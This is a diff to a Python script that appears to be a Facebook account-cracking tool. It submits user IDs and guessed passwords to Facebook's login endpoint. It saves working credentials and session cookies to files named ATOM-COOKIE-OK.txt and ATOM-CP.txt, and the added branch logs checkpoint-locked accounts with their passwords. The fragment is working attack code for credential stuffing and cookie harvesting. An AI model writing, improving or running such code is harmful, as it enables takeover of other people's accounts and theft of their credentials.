@@ -1584,7 +1584,6 @@ def x(uid,pwx,tl):
             'Content-Length': '847'}
             url = "https://b-graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
-            print(result)
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
@@ -1610,6 +1609,11 @@ def x(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
+            elif 'www.facebook.com' in q['error']['message']:
+                #print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                open("/sdcard/ATOM-CP.txt", "a").write(f"{uid}|{pw}|\n")
+                cps.append(uid)
+                break
             else:
                 continue
         loop+=1
